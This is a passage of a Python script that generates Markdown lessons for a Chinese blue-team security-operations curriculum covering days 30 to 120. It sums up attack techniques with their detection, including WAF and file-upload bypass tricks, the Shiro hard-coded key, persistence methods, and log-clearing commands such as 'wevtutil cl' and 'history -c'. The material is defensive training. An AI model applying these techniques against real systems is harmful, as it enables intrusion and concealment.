     [('简历Checklist', '联系方式清晰→技能列表具体(工具+能做什么)→有数据支撑→有护网关键词→格式整洁无错别字'),
      ('软技能问题', '为什么想做安全运营？怎么看待加班/夜班？团队分歧怎么办？职业规划？'),
      ('薪资参考', '初级蓝队/安全运营：一线城市8-15K，二线6-10K。护网期间有额外补贴')],
     '1.优化简历 2.找朋友做模拟面试 3.录音回听优化',
     '- [ ] 简历优化完成\n- [ ] 至少完成1次模拟面试'),
    
    (60, '初级阶段综合考核与能力复盘', '⭐⭐ 基础',
     ['第29-59天知识大回顾', '综合能力考核', '制定下一阶段计划'],
     [('能力自评标准', '独立值守✓/✗ 告警研判>=80% ✓/✗ 基础日志分析 ✓/✗ 简单事件处置 ✓/✗ 识别4种以上攻击 ✓/✗'),
      ('考核内容', '理论知识(ATT&CK/OWASP/漏洞原理)、工具技能(Wireshark/Nmap/BurpSuite/ELK)、实战分析(综合攻击日志)、流程掌握(研判→应急→护网)'),
      ('下一阶段', '如果五项自评全达标→进入第二阶段(中级蓝队进阶61-90天)。如果有差距→回顾薄弱环节再前进')],
     '完成初级阶段综合自评，决定是否进入第二阶段',
     '- [ ] 五项能力自评全达标\n- [ ] 制定第二阶段学习计划'),
]

# Days 61-90 (simplified)
SHORT_DAYS_61_90 = [
    (61, 'SQL注入WAF绕过与检测规则优化', '⭐⭐⭐ 中等', ['深入WAF绕过技巧', '优化检测规则'], [('绕过进阶', '二次编码绕过(%2527)、宽字节注入(GBK)、HTTP参数污染、分块传输'), ('规则优化', '规则太宽→误报多、太窄→漏报多。分层检测：前端快速筛选，后端深度分析')], '尝试不同绕过手法并设计对应检测规则', '- [ ] 理解3种以上高级绕过\n- [ ] 能优化IDS检测规则'),
    (62, 'XSS平台与CSP绕过', '⭐⭐⭐ 中等', ['了解CSP机制', 'XSS高级检测'], [('CSP', 'Content Security Policy限制资源加载来源。绕过：JSONP劫持、unsafe-inline配置、DOM XSS'), ('XSS平台', '攻击者收集XSS结果的平台，蓝队监控平台域名发现攻击')], '查看主流网站CSP头，了解XSS平台原理', '- [ ] 理解CSP\n- [ ] 能识别不安全CSP配置'),
    (63, '文件上传全类型绕过与检测', '⭐⭐⭐ 中等', ['全面掌握绕过手法', '设计多层检测方案'], [('绕过矩阵', '前端JS→抓包改、后缀黑名单→.php5/.phtml、Content-Type→image/jpeg、文件头→图片马、目录不可执行→文件包含配合'), ('多层防御', '上传目录禁脚本执行、文件类型白名单、内容检查、行为监控')], '尝试8种绕过手法并设计对应的3层检测方案', '- [ ] 掌握8种绕过\n- [ ] 能设计多层防御'),
    (64, '命令注入、代码注入高级利用与检测', '⭐⭐⭐ 中等', ['区分命令注入与代码注入', '高级检测'], [('命令vs代码注入', '命令注入针对OS命令，代码注入针对编程语言(eval/SSTI)。SSTI输入数学表达式看返回'), ('无回显注入', '通过时间延迟或DNS请求外带数据判断注入是否成功')], '在DVWA尝试无回显命令注入', '- [ ] 能区分两种注入\n- [ ] 了解SSTI攻击'),
    (65, 'SSRF、XXE漏洞深度利用与防御', '⭐⭐⭐ 中等', ['深入SSRF攻击面', '掌握XXE原理'], [('SSRF全攻击面', '内网探测(时间差异判断端口)、云Metadata(169.254.169.254)、协议利用(file/gopher/dict)、组合攻击(SSRF+Redis)'), ('XXE防御', '禁用外部实体解析(各种语言配置不同)')], '了解SSRF+Redis组合攻击和XXE payload结构', '- [ ] 理解SSRF完整攻击面\n- [ ] 知道XXE防御方法'),
    (66, '逻辑漏洞与越权攻击检测', '⭐⭐⭐ 中等', ['区分水平/垂直越权', '检测思路'], [('越权类型', '水平越权(同级别用户互看数据)、垂直越权(低权限访问高权限功能)'), ('检测难点', '日志中看起来完全正常。需行为基线+业务规则+步骤完整性多维度检测')], '设计一个越权检测的日志分析思路', '- [ ] 能区分两种越权\n- [ ] 有逻辑漏洞检测思路'),
    (67, 'Shiro/Weblogic/Fastjson反序列化漏洞', '⭐⭐⭐ 中等', ['理解反序列化原理', '检测三大框架漏洞'], [('反序列化原理', '字节流转回对象时的安全问题。Shiro RememberMe硬编码密钥(kPH+bIxk5D2deZiIxcaaaA==)、Fastjson autoType'), ('检测特征', 'Cookie含rememberMe=deleteMe且值很长、流量含反序列化payload特征')], '搭建Shiro漏洞环境并分析流量特征', '- [ ] 理解反序列化原理\n- [ ] 能识别Shiro攻击流量'),
    (68, 'BurpSuite高级用法', '⭐⭐⭐ 中等', ['攻击链路还原', '高级功能使用'], [('链路还原', '从Wireshark提取攻击请求→Repeater逐个重放→分析每步意图→Comparer对比响应差异'), ('蓝队分析', 'Decoder解码多层编码、Sequencer分析Token可预测性')], '用BurpSuite还原一条完整攻击链路', '- [ ] 能还原攻击链路\n- [ ] 能解码多层编码payload'),
    (69, 'SQLMap高级用法与流量特征识别', '⭐⭐⭐ 中等', ['深入SQLMap技术', '编写精准检测规则'], [('四种技术', '布尔盲注(AND 1=1/1=2交替)、时间盲注(SLEEP/BENCHMARK)、报错注入(extractvalue/updatexml)、UNION注入(ORDER BY+UNION SELECT)'), ('检测规则', '针对每种技术的独特流量模式编写精确匹配规则')], '用不同technique扫描DVWA并对比流量差异', '- [ ] 了解4种注入技术\n- [ ] 能区分不同技术流量特征'),
    (70, 'OWASP Top 10综合复盘', '⭐⭐⭐ 中等', ['回顾Top10全貌', '检测方案总结'], [('一一对应', '每个Top10漏洞→蓝队检测重点→检测工具→日志特征。形成完整的Web安全检测矩阵'), ('阶段总结', '61-70天Web安全深度防御阶段完成，评估自己的检测覆盖度')], '完成Web安全阶段知识总结和自测', '- [ ] 每个Top10都有对应检测方法\n- [ ] Web安全达到中级水平'),
]

# Days 71-80
SHORT_DAYS_71_80 = [
    (71, 'Windows/Linux安全基线核查与合规整改', '⭐⭐⭐ 中等', ['了解安全基线概念', '系统基线检查'], [('安全基线', '系统安全的最低门槛。Win:密码策略+账户策略+审计策略+用户权限+服务配置。Linux:密码策略+PAM+SSH配置+文件权限+审计'), ('基线工具', 'CIS Benchmark(国际标准)、OpenSCAP(自动化检查)')], '对Linux执行一次安全基线检查', '- [ ] 理解安全基线概念\n- [ ] 能执行基线检查'),
    (72, '数据库中间件安全配置与基线检查', '⭐⭐⭐ 中等', ['MySQL/Redis/Nginx安全基线'], [('各服务基线', 'MySQL:禁远程root/删匿名用户/开启审计。Redis:设密码/绑127.0.0.1/重命名危险命令。Nginx:隐藏版本/限制请求方法/禁目录浏览')], '检查MySQL/Redis/Nginx配置并整改', '- [ ] 掌握3种服务安全基线'),
    (73, '内网渗透路径与攻击手法检测点映射', '⭐⭐⭐ 中等', ['理解内网渗透全阶段', 'ATT&CK映射'], [('内网渗透阶段', '获取据点→信息收集→提权→横向移动→维持访问→窃取数据'), ('检测映射', '信息收集(监控命令执行)、横向移动(RDP/SSH/SMB监控)、凭据窃取(LSASS访问监控)')], '映射内网渗透各阶段到ATT&CK', '- [ ] 了解内网渗透6阶段\n- [ ] 能说出各阶段检测方法'),
    (74, '内网横向移动权限提升的攻击检测', '⭐⭐⭐ 中等', ['横向移动检测', '提权检测'], [('横向移动', 'Win:事件ID 4624(登录类型3网络/10RDP)、4672(特殊权限)。Linux:secure日志异常远程登录、sudo使用'), ('提权检测', 'Win:新增管理员组成员、进程SYSTEM权限但非系统进程。Linux:新增SUID文件、sudoers修改')], '在Windows/Linux日志中分析横向移动痕迹', '- [ ] 能检测横向移动\n- [ ] 能检测提权行为'),
    (75, 'Webshell隐藏手法与深度检测方案', '⭐⭐⭐ 中等', ['了解隐藏手法', '深度检测'], [('隐藏手法', '时间伪造(touch -r)、文件名伪装、图片隐藏、内存马(无文件落地)、.htaccess文件包含'), ('深度检测', '文件完整性监控(哈希对比)、进程内存扫描、流量行为分析(Web进程外连)、工具(D盾/河马查杀)'), ('内存马', '直接注入Java进程内存(Filter/Servlet/Listener型)，传统文件扫描无法发现')], '制作隐藏webshell并尝试用检测手段发现', '- [ ] 了解5种隐藏手法\n- [ ] 知道深度检测方法'),
    (76, '权限维持技术（计划任务/服务/后门）与排查方法', '⭐⭐⭐ 中等', ['了解持久化手法', '排查方法'], [('Win持久化', '计划任务/服务/注册表Run/启动文件夹/WMI事件订阅/DLL劫持。排查:schtasks/Get-Service/注册表Run键'), ('Linux持久化', 'crontab/systemd服务/.bashrc后门/SSH authorized_keys/LD_PRELOAD劫持。排查:crontab -l+/etc/cron*/.bashrc检查')], '模拟添加持久化后门并用排查方法发现', '- [ ] 了解Win/Linux持久化手法\n- [ ] 能执行完整排查'),
    (77, '域环境安全基础与域渗透检测', '⭐⭐⭐ 中等', ['理解域架构', '域渗透检测'], [('域概念', 'Windows企业网络管理架构，域控(DC)是核心，管理所有用户和计算机。获取域管理员=控制整个域'), ('检测', 'Kerberoasting(监控Kerberos票据)、DCSync(事件ID 4662)、Pass-the-Hash(非交互式登录的特征)')], '了解Kerberos认证过程和域渗透基础', '- [ ] 理解域架构\n- [ ] 了解域渗透检测方法'),
    (78, '黄金票据/白银票据攻击原理与检测', '⭐⭐⭐ 中等', ['理解Kerberos认证', '票据攻击检测'], [('黄金票据', '伪造TGT(用krbtgt Hash)，可伪装任意用户。检测:TGT生命周期异常(默认10h)、PAC数据不一致'), ('白银票据', '伪造ST(用服务账号Hash)，只访问特定服务。检测:DC无对应TGT请求却有服务访问')], '理解Kerberos认证流程和票据攻击检测思路', '- [ ] 理解Kerberos认证\n- [ ] 能区分两种票据攻击'),
    (79, 'Cobalt Strike攻击特征与流量检测', '⭐⭐⭐ 中等', ['了解CS框架', 'CS流量检测'], [('CS简介', '红队/攻击者最常用商业渗透框架，含C2通信、横向移动、权限维持、钓鱼功能'), ('流量特征', 'HTTP Beacon心跳间隔可配、URI模式可识别、Cookie含Base64 metadata、JA3/JA3S指纹异常')], '了解CS基本工作原理和常见检测规则', '- [ ] 了解CS功能\n- [ ] 知道CS流量检测方法'),
    (80, '等保2.0二级/三级基线核查实操', '⭐⭐⭐ 中等', ['等保二级/三级要求', '基线核查实操'], [('二级要求', '身份鉴别+访问控制+安全审计(日志6个月)+入侵防范+数据完整性'), ('三级加强', '双因子认证+强制访问控制+日志实时分析+漏洞扫描定期化+应急预案演练'), ('核查清单', '账号安全→口令策略→登录策略→访问控制→审计日志→补丁管理→恶意代码防范')], '对照等保二级要求对Linux执行模拟基线核查', '- [ ] 了解二级/三级要求差异\n- [ ] 完成模拟基线核查'),
]

# Days 81-90
SHORT_DAYS_81_90 = [
    (81, '企业级应急响应标准流程与组织架构', '⭐⭐⭐ 中等', ['应急组织架构', '事件分级上报'], [('组织架构', '指挥组(决策)→技术处置组→信息通报组→后勤保障组'), ('事件分级', 'I级特别重大/II级重大/III级较大/IV级一般。上报链路:分析师→TL→安全负责人→CTO→CEO→监管')], '设计中小企业应急组织架构和上报流程', '- [ ] 理解应急组织架构\n- [ ] 知道事件分级标准'),
    (82, 'Windows高级应急响应（内存取证+痕迹排查）', '⭐⭐⭐ 中等', ['内存取证', '痕迹排查'], [('内存取证', 'Volatility/Rekall/Redline工具。分析:隐藏进程/恶意注入/加密配置/网络历史'), ('痕迹排查', 'Prefetch(程序执行记录)/Shimcache(兼容缓存)/Shellbags(文件夹访问)/MFT(文件操作)')], '了解Volatility基本用法，分析内存镜像样本', '- [ ] 了解内存取证\n- [ ] 知道Windows痕迹排查方法'),
    (83, 'Linux高级应急响应（rootkit检测+日志溯源）', '⭐⭐⭐ 中等', ['Rootkit检测', '日志溯源'], [('Rootkit检测', 'chkrootkit/rkhunter。对比/proc和ps输出找隐藏进程，检查系统调用表'), ('日志溯源', 'auditd审计规则+MACB时间戳(Modify/Access/Change/Birth)+被删文件恢复(extundelete/testdisk)')], '安装rkhunter扫描系统了解rootkit检测', '- [ ] 了解rootkit检测\n- [ ] 知道日志溯源方法'),
    (84, '恶意软件静态/动态分析基础', '⭐⭐⭐ 中等', ['静态分析', '动态分析'], [('静态分析', '不运行软件:PE头信息/导入表/字符串提取(strings)/加壳检测'), ('动态分析', '在沙箱运行:Cuckoo/ANY.RUN。进程监控/网络监控/注册表监控。必须隔离环境！'), ('蓝队目的', '提取IOC(C2/域名)、理解恶意功能(勒索/挖矿/窃密)、判断危害范围')], '了解ANY.RUN在线沙箱，搜索恶意软件分析报告', '- [ ] 知道静态/动态分析区别\n- [ ] 了解沙箱使用方法'),
    (85, '攻击路径完整还原与证据链固定', '⭐⭐⭐ 中等', ['攻击路径还原', '证据链固定'], [('路径还原', '时间线排序告警→连接同源事件→补全缺失环节→输出攻击流程图'), ('证据链', '完整性(哈希校验)+连续性(每步有记录)+合法性(过程合规)。证据类型:数字/文件/配置')], '基于Day27告警数据画出完整攻击路径图', '- [ ] 能还原攻击路径\n- [ ] 理解证据链三要素'),
    (86, '攻击者画像与溯源分析方法', '⭐⭐⭐ 中等', ['攻击者画像', '溯源技术'], [('画像维度', '技术水平/攻击动机/组织归属/攻击偏好。通过IP/TTPs/工具/语言/活跃时间判断'), ('溯源技术', 'IP反查+域名Whois+样本关联+TTPs关联(ATT&CK模式匹配)。归因难度:跳板/VPN/Tor/False Flag')], '了解APT组织和归因分析方法', '- [ ] 了解画像维度\n- [ ] 知道溯源技术手段'),
    (87, '磁盘取证与内存取证工具使用', '⭐⭐⭐ 中等', ['磁盘取证', '内存取证进阶'], [('磁盘取证', 'FTK Imager制作镜像/dd命令/Autopsy分析平台。格式:DD(原始)/E01(压缩校验)/AFF'), ('内存取证', 'Volatility插件:pslist/psscan/netscan/cmdscan/malfind。可发现隐藏进程/注入代码')], '用dd命令制作目录镜像并计算哈希', '- [ ] 了解取证镜像格式\n- [ ] 会用dd命令制作镜像'),
    (88, '蜜罐部署与威胁情报联动', '⭐⭐⭐ 中等', ['蜜罐概念', '情报联动'], [('蜜罐类型', '低交互(模拟服务Cowrie SSH)、高交互(真实系统风险高)。T-Pot多蜜罐集成平台'), ('情报联动', '蜜罐捕获IP→自动同步黑名单、恶意样本→上传VirusTotal分析、攻击手法→更新检测规则')], '了解T-Pot蜜罐平台和蜜罐情报联动案例', '- [ ] 理解蜜罐原理\n- [ ] 知道情报联动机制'),
    (89, '云安全基础（云WAF+云日志审计+云主机安全）', '⭐⭐⭐ 中等', ['云安全责任共担', '云安全产品体系'], [('责任共担', '云厂商负责云的安全(基础设施)、客户负责云中的安全(数据/应用/配置)'), ('云安全产品', '云WAF+云日志审计(SLS/CLS/CloudWatch)+云主机安全(安全组/云安全中心/堡垒机)')], '了解主流云平台安全产品体系', '- [ ] 理解责任共担模型\n- [ ] 了解云安全产品'),
    (90, '中级阶段综合考核与面试准备', '⭐⭐⭐ 中等', ['中级能力自评', '面试准备'], [('能力对标', '1-3年:独立应急响应+攻击溯源+内网攻击检测+安全基线核查'), ('面试重点', '描述一次完整应急响应经历、如何处理0day、内网横向移动如何检测、ATT&CK框架怎么用')], '完成中级阶段综合自测，评估是否达到中级水平', '- [ ] 能力自评达标\n- [ ] 准备中级面试题'),
]

# Days 91-120 (CONDENSED for speed)
def gen_short_91_120():
    topics = [
        (91, 'APT攻击生命周期与真实案例深度解析', ['APT(高级持续性威胁)是国家级/有组织黑客发起的定向攻击，长期潜伏+高度定制化。生命周期:侦察→入侵→据点→提权→内部侦察→横向移动→数据收集→渗出'], '搜索APT攻击案例分析，思考如何发现'),
        (92, '供应链攻击原理检测与防御方案', ['不直接攻击目标而是攻击供应商/软件提供方(SolarWinds/XZ Utils)。检测:软件物料清单(SBOM)、新软件行为基线、第三方组件漏洞监控'], '了解SolarWinds和XZ Utils两大供应链攻击事件'),
        (93, '0day/Nday漏洞快速响应与临时防护方案', ['0day=厂商不知道的漏洞(无补丁)、1day=刚公开的漏洞。应急:评估影响→临时防护(WAF虚拟补丁/IPS规则)→监控→等补丁'], '查最近高危CVE，思考应急响应方案'),
        (94, 'AI辅助钓鱼与无文件攻击等新型攻击检测', ['AI钓鱼(ChatGPT生成以假乱真邮件/DeepFake冒充)。无文件攻击(恶意代码只在内存/PowerShell/WMI)。检测:监控PowerShell执行+WMI活动+异常进程行为'], '了解无文件攻击检测方法'),
        (95, '域渗透高级技术（DCSync等）与检测方案', ['DCSync:获取域控复制权限后同步所有用户凭据哈希。检测:事件ID 4662(域控复制操作)、非域控IP发起复制'], '了解DCSync攻击原理和4662事件ID检测'),
        (96, '云环境渗透与容器逃逸检测与防御', ['容器逃逸:特权容器+挂载根目录/docker.sock利用。K8s:RBAC滥用/etcd未授权/Dashboard暴露。检测:Falco运行时监控/K8s审计日志/Trivy镜像扫描'], '了解Docker容器逃逸手法和Falco监控'),
        (97, '内存攻击无文件攻击的检测与处置', ['内存攻击:进程注入(CreateRemoteThread)+反射DLL加载+Process Hollowing。检测:Sysmon事件ID 8(远程线程)/ID 10(进程访问)/AMSI'], '了解Sysmon在Windows安全监控中的重要性'),
        (98, '全流量深度分析与异常行为检测', ['全流量分析平台:Arkime(Moloch)/Zeek(Bro)。检测:统计基线(每IP平均流量/连接数)→发现偏离异常→深入分析。隐蔽通道:DNS隧道/ICMP隧道'], '了解Zeek/Arkime部署方式和全流量分析价值'),
        (99, '多源日志关联分析与场景化规则编写', ['多源关联:Web日志+IDS+终端+情报→同一事件多维度交叉验证。关联场景:暴破成功(多次失败+成功)、Webshell(上传+后续POST)、横向移动(多机同用户登录)'], '设计至少3条关联分析规则'),
        (100, 'UEBA用户行为分析与落地方法', ['UEBA:学习正常行为→发现偏离异常。分析维度:登录行为(时间/地点/设备)、数据访问模式、应用使用。检测被盗凭据/内部威胁/横向移动'], '了解UEBA产品(Splunk UBA/Exabeam)实现原理'),
        (101, '威胁狩猎方法论与实战落地', ['威胁狩猎vs值守:值守被动等告警，狩猎主动找漏网之鱼。步骤:提出假设→收集数据→分析→发现线索→调查→处置。典型狩猎假设:攻击者在内网做SMB扫描'], '提出一个威胁狩猎假设并设计分析步骤'),
        (102, '隧道技术端口转发内网穿透的检测', ['隧道技术:将一种协议封装在另一种协议中传输。DNS隧道(iodine/DNSCat2)、ICMP隧道、HTTP隧道(reGeorg)。检测:DNS查询体积异常(正常<512字节)'], '了解SSH端口转发和DNS隧道检测'),
        (103, '攻击痕迹清除与反取证技术对抗', ['痕迹清除:清日志(wevtutil cl/history -c)、时间戳篡改(timestomp)、覆盖删除(sdelete)。对抗:日志实时同步远程SIEM、文件完整性监控、端点保护'], '了解常见痕迹清除手法和检测方法'),
        (104, '红蓝对抗实战复盘（蓝队视角）', ['红蓝对抗复盘:红队透露攻击路径→蓝队对比发现情况→找出检测盲区→优化规则流程。常见失分:告警忽略/关联缺失/响应太慢'], '回顾Day27模拟值守写蓝队复盘报告'),
        (105, '高级攻防技术综合复盘', ['第一阶段回顾:APT→供应链→0day→新型攻击→域渗透→云安全。绘制个人技能雷达图，评估各维度掌握程度'], '绘制技能雷达图评估能力'),
        (106, '重大安全事件应急指挥与决策', ['事件指挥体系(ICS):借鉴消防应急管理，明确角色责任。决策原则:先保人→再止损→再查因→最后追责'], '模拟勒索软件事件设计指挥架构和决策'),
        (107, '深度溯源与攻击链路完整复盘', ['深度溯源:从受害主机追溯到攻击者真实身份。加密货币追踪:比特币地址追踪+交易所KYC。复盘:完整APT攻击案例技术分析'], '找公开APT分析报告学习专业分析写法'),
        (108, '纵深防御体系设计与落地', ['纵深防御:攻击链每环节都设防线。层次:网络边界→内部网络→主机→应用→数据→人员。设计:资产识别→威胁建模→方案设计→验证→优化'], '为模拟值守公司设计纵深防御方案'),
        (109, '零信任架构在护网与企业安全中的应用', ['零信任:Never Trust Always Verify。三大支柱:身份认证+设备认证+上下文感知。SDP:先认证再连接。护网价值:外网被打穿也无法横向移动'], '了解Google BeyondCorp零信任实践'),
        (110, '场景化差异防护方案设计', ['不同行业:金融(数据安全+合规)、政务(信息泄露)、互联网(业务安全+爬虫)、制造(工控)。不同规模:小(防火墙+端点+WAF)、中(+SOC+SIEM)、大(+零信任+狩猎)'], '为中型电商公司设计场景化防护方案'),
        (111, '护网技战法体系构建与沉淀', ['技战法体系:攻击检测方法库+应急SOP+研判SOP+日志分析手册+误报库。知识沉淀:历次护网复盘+典型案例库+FAQ。初级蓝队:记录典型告警和研判过程'], '整理28天+120天笔记构建个人技战法体系'),
        (112, '专项防御方案编写与验证', ['专项方案:针对勒索/挖矿/数据泄露/供应链攻击。结构:威胁分析→防护目标→技术方案→管理方案→验证方案→应急预案。验证:模拟攻击验证有效性'], '编写防勒索软件专项防御方案'),
        (113, '等保2.0体系建设与合规落地', ['体系建设:定级→备案→安全建设→测评→监督检查。三级要求:物理+网络+主机+应用+数据+安全管理中心每层具体要求。蓝队:日常运维确保合规'], '了解等保定级和测评基本流程'),
        (114, '安全运营体系搭建与优化', ['安全运营全景:资产管理+漏洞管理+事件管理+情报管理+合规管理+度量管理。KPI:MTTD(平均检测时间)+MTTR(平均响应时间)。优化:PDCA循环'], '设计安全运营KPI指标体系'),
        (115, '防御演练与方案验证方法', ['演练类型:桌面推演(纸上)→模拟演练(验证)→实战(红蓝)。设计:目标→场景→环境→执行→复盘。蓝队:主力参与者，暴露问题是目标'], '设计Web服务器安全演练场景'),
        (116, '护网整体防守指挥模拟与排班调度', ['防守指挥:人员调度+事件升级决策+资源调配+信息通报。排班:白班人力最多，夜班精简但核心能力在岗。大型护网(100人)排班设计'], '模拟设计100人护网排班方案'),
        (117, '高强度APT级攻击对抗实战', ['APT特点:针对性+持续性+隐蔽性。对抗:从被动告警到主动狩猎、从单点检测到端到端可观测、从事件响应到持续对抗。武器:UEBA+NTA+EDR+情报+蜜罐'], '设计针对APT的纵深防御+持续检测方案'),
        (118, '完整攻防复盘报告输出', ['复盘报告高级版:技术分析+管理分析。框架:概述→攻击路径→检测发现→响应过程→根因→管理问题→技术改进→管理改进。数据说话，结论先行，建议可落地'], '基于Day27写完整攻防复盘报告'),
        (119, '蓝队技战法手册编制', ['手册目的:个人经验→团队资产、新员工快速上手、护网前快速备战。结构:值守篇+研判篇+日志分析篇+应急篇+工具篇+误报篇+案例篇。持续更新'], '启动编制个人蓝队技战法手册'),
        (120, '职业规划与认证建议', ['职业路径:初级SOC分析师L1→中级安全运营工程师L2→高级安全运营专家L3→安全运营经理→CSO。认证:入门Security+/软考、中级CISP/CISSP、高级OSCP/OSDA。实战能力永远第一'], '制定个人未来1年职业发展计划'),
    ]
    
    result = {}
    for day, title, content_tuple, tasks in topics:
        content_text, task_text = content_tuple, tasks
        phase_name, phase_str = phase_info(day)
        result[day] = TEMPLATE.format(
            day=day, title=title, phase=phase_name, diff='⭐⭐⭐⭐ 高级',
            phase_str=phase_str,
            goals='1. 理解核心概念\n2. 掌握蓝队对应检测技能\n3. 完成实战练习',
            content=f'### 核心知识\n\n{content_text}\n\n### 蓝队实战要点\n\n将理论知识转化为检测能力和防御措施。每个高级主题都需要结合前90天的基础技能来理解和应用。',
            tasks=f'1. {task_text}\n2. 将今天知识点整理到笔记库\n3. 搜索相关关键词深入了解',
            checklist=f'- [ ] 理解{title}的核心概念\n- [ ] 完成实操任务\n- [ ] 知识点已整理到笔记库'
        )
    return result


# ============================================================
# MAIN
# ============================================================
def main():
    all_data = {}
    
    # Day 30-40
    for day, d in get_day_30_40().items():
        phase_name, phase_str = phase_info(day)
        all_data[day] = TEMPLATE.format(
            day=day, title=d['title'], phase=phase_name, diff=d['diff'],
            phase_str=phase_str, goals=d['goals'], content=d['content'],
            tasks=d['tasks'], checklist=d['checklist']
        )
    
    # Day 41-50
    for day, title, diff, goals, content, tasks, checklist in SHORT_DAYS_41_50:
        phase_name, phase_str = phase_info(day)
        goals_text = '\n'.join(f'{i}. {g}' for i, g in enumerate(goals, 1))
        content_text = '\n\n'.join(f'### {c[0]}\n\n{c[1]}' for c in content)
        all_data[day] = TEMPLATE.format(
            day=day, title=title, phase=phase_name, diff=diff,
            phase_str=phase_str, goals=goals_text, content=content_text,
            tasks=tasks, checklist=checklist
        )
    
    # Day 51-60
    for day, title, diff, goals, content, tasks, checklist in SHORT_DAYS_51_60:
        phase_name, phase_str = phase_info(day)
        goals_text = '\n'.join(f'{i}. {g}' for i, g in enumerate(goals, 1))
        content_text = '\n\n'.join(f'### {c[0]}\n\n{c[1]}' for c in content)
        all_data[day] = TEMPLATE.format(
            day=day, title=title, phase=phase_name, diff=diff,
            phase_str=phase_str, goals=goals_text, content=content_text,
            tasks=tasks, checklist=checklist
        )
    
    # Day 61-70
    for day, title, diff, goals, content, tasks, checklist in SHORT_DAYS_61_90:
        phase_name, phase_str = phase_info(day)
        goals_text = '\n'.join(f'{i}. {g}' for i, g in enumerate(goals, 1))
        content_text = '\n\n'.join(f'### {c[0]}\n\n{c[1]}' for c in content)
        all_data[day] = TEMPLATE.format(
            day=day, title=title, phase=phase_name, diff=diff,
            phase_str=phase_str, goals=goals_text, content=content_text,
            tasks=tasks, checklist=checklist
        )
    
    # Day 71-80
    for day, title, diff, goals, content, tasks, checklist in SHORT_DAYS_71_80:
        phase_name, phase_str = phase_info(day)
        goals_text = '\n'.join(f'{i}. {g}' for i, g in enumerate(goals, 1))
        content_text = '\n\n'.join(f'### {c[0]}\n\n{c[1]}' for c in content)
        all_data[day] = TEMPLATE.format(
            day=day, title=title, phase=phase_name, diff=diff,
            phase_str=phase_str, goals=goals_text, content=content_text,
            tasks=tasks, checklist=checklist
        )
    
    # Day 81-90
    for day, title, diff, goals, content, tasks, checklist in SHORT_DAYS_81_90:
        phase_name, phase_str = phase_info(day)
        goals_text = '\n'.join(f'{i}. {g}' for i, g in enumerate(goals, 1))
        content_text = '\n\n'.join(f'### {c[0]}\n\n{c[1]}' for c in content)
        all_data[day] = TEMPLATE.format(
            day=day, title=title, phase=phase_name, diff=diff,
            phase_str=phase_str, goals=goals_text, content=content_text,
            tasks=tasks, checklist=checklist
        )
    
    # Day 91-120
    all_data.update(gen_short_91_120())
    
    # Write all files
    created = 0
    for day in range(30, 121):
        if day not in all_data:
            print(f'MISSING: Day {day}')
            continue
        
        filepath = os.path.join(OUT, f'day-{day}.md')
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(all_data[day])
        created += 1
        print(f'Day {day}: OK')
    
    print(f'\nTotal: {created} files created (Day 30-120)')

if __name__ == '__main__':
    main()
